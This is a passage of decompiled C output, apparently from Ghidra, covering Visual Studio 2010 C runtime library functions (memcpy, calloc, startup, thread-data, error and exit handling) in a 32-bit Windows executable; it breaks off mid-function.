      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040bf3f_caseD_0:
    return _Dst;
  }
  if (((0x7f < _Size) && (DAT_00423830 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy(_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040bdb9_caseD_2;
      case 3:
        goto switchD_0040bdb9_caseD_3;
      }
      goto switchD_0040bdb9_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040bdb9_caseD_0;
    case 1:
      goto switchD_0040bdb9_caseD_1;
    case 2:
      goto switchD_0040bdb9_caseD_2;
    case 3:
      goto switchD_0040bdb9_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040bdb9_caseD_2;
          case 3:
            goto switchD_0040bdb9_caseD_3;
          }
          goto switchD_0040bdb9_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040bdb9_caseD_2;
          case 3:
            goto switchD_0040bdb9_caseD_3;
          }
          goto switchD_0040bdb9_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040bdb9_caseD_2;
          case 3:
            goto switchD_0040bdb9_caseD_3;
          }
          goto switchD_0040bdb9_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040bdb9_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040bdb9_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040bdb9_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040bdb9_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _calloc
// 
// Library: Visual Studio 2010 Release

void * __cdecl _calloc(size_t _Count,size_t _Size)

{
  LPVOID pvVar1;
  int *piVar2;
  int local_8;
  
  local_8 = 0;
  pvVar1 = __calloc_impl(_Count,_Size,&local_8);
  if ((pvVar1 == (LPVOID)0x0) && (local_8 != 0)) {
    piVar2 = __errno();
    if (piVar2 != (int *)0x0) {
      piVar2 = __errno();
      *piVar2 = local_8;
    }
  }
  return pvVar1;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2010 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_00421878 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040c296)
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2010 Release

int ___tmainCRTStartup(void)

{
  int iVar1;
  short *psVar2;
  _STARTUPINFOW local_6c;
  int local_24;
  int local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0041e980;
  uStack_c = 0x40c269;
  GetStartupInfoW(&local_6c);
  if (DAT_0042497c == 0) {
    HeapSetInformation((HANDLE)0x0,HeapEnableTerminationOnCorruption,(PVOID)0x0,0);
  }
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = (undefined *)0x0;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_00424978 = GetCommandLineW();
  DAT_00421874 = ___crtGetEnvironmentStringsW();
  iVar1 = __wsetargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __wsetenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  psVar2 = (short *)__wwincmdln();
  local_24 = FUN_00401000((HINSTANCE)&IMAGE_DOS_HEADER_00400000,0,psVar2);
  if (local_20 == 0) {
                    // WARNING: Subroutine does not return
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_00421998 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_0042199c = &stack0x00000004;
  _DAT_004218d8 = 0x10001;
  _DAT_00421880 = 0xc0000409;
  _DAT_00421884 = 1;
  local_32c = DAT_00420044;
  local_328 = DAT_00420048;
  _DAT_0042188c = unaff_retaddr;
  _DAT_00421964 = in_GS;
  _DAT_00421968 = in_FS;
  _DAT_0042196c = in_ES;
  _DAT_00421970 = in_DS;
  _DAT_00421974 = unaff_EDI;
  _DAT_00421978 = unaff_ESI;
  _DAT_0042197c = unaff_EBX;
  _DAT_00421980 = in_EDX;
  _DAT_00421984 = in_ECX;
  _DAT_00421988 = in_EAX;
  _DAT_0042198c = unaff_EBP;
  DAT_00421990 = unaff_retaddr;
  _DAT_00421994 = in_CS;
  _DAT_004219a0 = in_SS;
  DAT_004218d0 = IsDebuggerPresent();
  FUN_00412700();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_0041a278);
  if (DAT_004218d0 == 0) {
    FUN_00412700();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FUN_0040c4da(undefined4 param_1)

{
  DAT_00421ba4 = param_1;
  return;
}



// Library Function - Single Match
//  __call_reportfault
// 
// Library: Visual Studio 2010 Release

void __cdecl __call_reportfault(int nDbgHookCode,DWORD dwExceptionCode,DWORD dwExceptionFlags)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  _EXCEPTION_POINTERS local_32c;
  EXCEPTION_RECORD local_324;
  undefined4 local_2d4;
  
  uVar1 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  if (nDbgHookCode != -1) {
    FUN_00412700();
  }
  local_324.ExceptionCode = 0;
  _memset(&local_324.ExceptionFlags,0,0x4c);
  local_32c.ExceptionRecord = &local_324;
  local_32c.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_324.ExceptionCode = dwExceptionCode;
  local_324.ExceptionFlags = dwExceptionFlags;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_32c);
  if (((LVar3 == 0) && (BVar2 == 0)) && (nDbgHookCode != -1)) {
    FUN_00412700();
  }
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2010 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  HANDLE hProcess;
  UINT uExitCode;
  
  __call_reportfault(2,0xc0000417,1);
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

void __invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                        uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)DecodePointer(DAT_00421ba4);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040c64d. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



void FUN_0040c664(void)

{
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return;
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2010 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00420050)[uVar1 * 2]) {
      return (&DAT_00420054)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2010 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_004201b8;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2010 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_004201bc;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



void FUN_0040c6ff(void)

{
  EncodePointer((PVOID)0x0);
  return;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2010 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_004201c4);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = DecodePointer(DAT_00421bac);
    TlsSetValue(DAT_004201c4,lpTlsValue);
  }
  return lpTlsValue;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2010 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_004201c0 != -1) {
    iVar2 = DAT_004201c0;
    pcVar1 = (code *)DecodePointer(DAT_00421bb4);
    (*pcVar1)(iVar2);
    DAT_004201c0 = -1;
  }
  if (DAT_004201c4 != 0xffffffff) {
    TlsFree(DAT_004201c4);
    DAT_004201c4 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2010 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  GetModuleHandleW(u_BKERNEL32_DLL_0041a27e + 1);
  _Ptd->_pxcptacttab = &DAT_0041b210;
  _Ptd->_terrno = 0;
  _Ptd->_holdrand = 1;
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_004205a8;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_0040c824();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_00420d10;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_0040c82d();
  return;
}



void FUN_0040c824(void)

{
  FUN_004127a9(0xd);
  return;
}



void FUN_0040c82d(void)

{
  FUN_004127a9(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2010 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_004201c0;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_004201c0;
      p_Var5 = _Ptd;
      pcVar1 = (code *)DecodePointer(DAT_00421bb0);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2010 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_0040c9e3(void)

{
  FUN_004127a9(0xd);
  return;
}



void FUN_0040c9ef(void)

{
  FUN_004127a9(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(u_BKERNEL32_DLL_0041a27e + 1);
  if (hModule == (HMODULE)0x0) {
    __mtterm();
    return 0;
  }
  DAT_00421ba8 = GetProcAddress(hModule,s_FlsAlloc_0041a2bc);
  DAT_00421bac = GetProcAddress(hModule,s_FlsGetValue_0041a2b0);
  DAT_00421bb0 = GetProcAddress(hModule,s_FlsSetValue_0041a2a4);
  DAT_00421bb4 = GetProcAddress(hModule,s_FlsFree_0041a29c);
  if ((((DAT_00421ba8 == (FARPROC)0x0) || (DAT_00421bac == (FARPROC)0x0)) ||
      (DAT_00421bb0 == (FARPROC)0x0)) || (DAT_00421bb4 == (FARPROC)0x0)) {
    DAT_00421bac = TlsGetValue_exref;
    DAT_00421ba8 = (FARPROC)&LAB_0040c708;
    DAT_00421bb0 = TlsSetValue_exref;
    DAT_00421bb4 = TlsFree_exref;
  }
  DAT_004201c4 = TlsAlloc();
  if ((DAT_004201c4 != 0xffffffff) && (BVar1 = TlsSetValue(DAT_004201c4,DAT_00421bac), BVar1 != 0))
  {
    __init_pointers();
    DAT_00421ba8 = (FARPROC)EncodePointer(DAT_00421ba8);
    DAT_00421bac = (FARPROC)EncodePointer(DAT_00421bac);
    DAT_00421bb0 = (FARPROC)EncodePointer(DAT_00421bb0);
    DAT_00421bb4 = (FARPROC)EncodePointer(DAT_00421bb4);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_0040c8c9;
      pcVar3 = (code *)DecodePointer(DAT_00421ba8);
      DAT_004201c0 = (*pcVar3)(puVar5);
      if ((DAT_004201c0 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_004201c0;
        p_Var6 = _Ptd;
        pcVar3 = (code *)DecodePointer(DAT_00421bb0);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
    __mtterm();
  }
  return 0;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_mscoree_dll_0041a2d8);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_CorExitProcess_0041a2c8);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2010 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_0040cbb6(void)

{
  __lock(8);
  return;
}



void FUN_0040cbbf(void)

{
  FUN_004127a9(8);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2010 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_0040c6ff();
  FUN_0040d08a(uVar1);
  FUN_0040c4da(uVar1);
  FUN_00412c3d(uVar1);
  FUN_00412c2e(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_00412a18();
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2010 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  code **ppcVar3;
  
  if ((PTR___fpmath_0041e620 != (undefined *)0x0) &&
     (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR___fpmath_0041e620), BVar1 != 0)) {
    (*(code *)PTR___fpmath_0041e620)(param_1);
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_0041a200,(undefined **)&DAT_0041a218);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_0041263f);
    ppcVar3 = (code **)&DAT_0041a1f8;
    do {
      if (*ppcVar3 != (code *)0x0) {
        (**ppcVar3)();
      }
      ppcVar3 = ppcVar3 + 1;
    } while (ppcVar3 < &DAT_0041a1fc);
    if ((DAT_00424974 != (code *)0x0) &&
       (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_00424974), BVar1 != 0)) {
      (*DAT_00424974)(0,2,0);
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040cde7)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2010 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  PVOID *ppvVar1;
  PVOID *ppvVar2;
  PVOID pvVar3;
  code *pcVar4;
  PVOID *ppvVar5;
  PVOID *ppvVar6;
  PVOID *local_34;
  PVOID *local_2c;
  PVOID *local_28;
  code **local_24;
  code **local_20;
  
  __lock(8);
  if (DAT_00421be8 != 1) {
    _DAT_00421be4 = 1;
    DAT_00421be0 = (undefined)param_3;
    if (param_2 == 0) {
      ppvVar1 = (PVOID *)DecodePointer(DAT_0042496c);
      if (ppvVar1 != (PVOID *)0x0) {
        ppvVar2 = (PVOID *)DecodePointer(DAT_00424968);
        local_34 = ppvVar1;
        local_2c = ppvVar2;
        local_28 = ppvVar1;
        while (ppvVar2 = ppvVar2 + -1, ppvVar1 <= ppvVar2) {
          pvVar3 = (PVOID)FUN_0040c6ff();
          if (*ppvVar2 != pvVar3) {
            if (ppvVar2 < ppvVar1) break;
            pcVar4 = (code *)DecodePointer(*ppvVar2);
            pvVar3 = (PVOID)FUN_0040c6ff();
            *ppvVar2 = pvVar3;
            (*pcVar4)();
            ppvVar5 = (PVOID *)DecodePointer(DAT_0042496c);
            ppvVar6 = (PVOID *)DecodePointer(DAT_00424968);
            if ((local_28 != ppvVar5) || (ppvVar1 = local_34, local_2c != ppvVar6)) {
              ppvVar1 = ppvVar5;
              ppvVar2 = ppvVar6;
              local_34 = ppvVar5;
              local_2c = ppvVar6;
              local_28 = ppvVar5;
            }
          }
        }
      }
      for (local_20 = (code **)&DAT_0041a21c; local_20 < &DAT_0041a228; local_20 = local_20 + 1) {
        if (*local_20 != (code *)0x0) {
          (**local_20)();
        }
      }
    }
    for (local_24 = (code **)&DAT_0041a22c; local_24 < &DAT_0041a230; local_24 = local_24 + 1) {
      if (*local_24 != (code *)0x0) {
        (**local_24)();
      }
    }
  }
  FUN_0040cde1();
  if (param_3 == 0) {
    DAT_00421be8 = 1;
    FUN_004127a9(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_0040cde1(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_004127a9(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2010 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2010 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2010 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2010 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  __exit(0xff);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __GET_RTERRMSG
// 
// Library: Visual Studio 2010 Release

wchar_t * __cdecl __GET_RTERRMSG(int param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_0041ab70)[uVar1 * 2]) {
      return (wchar_t *)(&PTR_u_R6002___floating_point_support_n_0041ab74)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x16);
  return (wchar_t *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2010 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  wchar_t *pwVar1;
  int iVar2;
  errno_t eVar3;
  DWORD DVar4;
  size_t sVar5;
  HANDLE hFile;
  uint uVar6;
  wchar_t **lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  wchar_t *local_200;
  char local_1fc [500];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  pwVar1 = __GET_RTERRMSG(param_1);
  local_200 = pwVar1;
  if (pwVar1 != (wchar_t *)0x0) {
    iVar2 = __set_error_mode(3);
    if ((iVar2 == 1) || ((iVar2 = __set_error_mode(3), iVar2 == 0 && (DAT_00420040 == 1)))) {
      hFile = GetStdHandle(0xfffffff4);
      if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
        uVar6 = 0;
        do {
          local_1fc[uVar6] = *(char *)(pwVar1 + uVar6);
          if (pwVar1[uVar6] == L'\0') break;
          uVar6 = uVar6 + 1;
        } while (uVar6 < 500);
        lpOverlapped = (LPOVERLAPPED)0x0;
        lpNumberOfBytesWritten = &local_200;
        local_1fc[499] = 0;
        sVar5 = _strlen(local_1fc);
        WriteFile(hFile,local_1fc,sVar5,(LPDWORD)lpNumberOfBytesWritten,lpOverlapped);
      }
    }
    else if (param_1 != 0xfc) {
      eVar3 = _wcscpy_s((wchar_t *)&DAT_00421bf0,0x314,u_Runtime_Error__Program__0041acac);
      if (eVar3 == 0) {
        _DAT_00421e2a = 0;
        DVar4 = GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_00421c22,0x104);
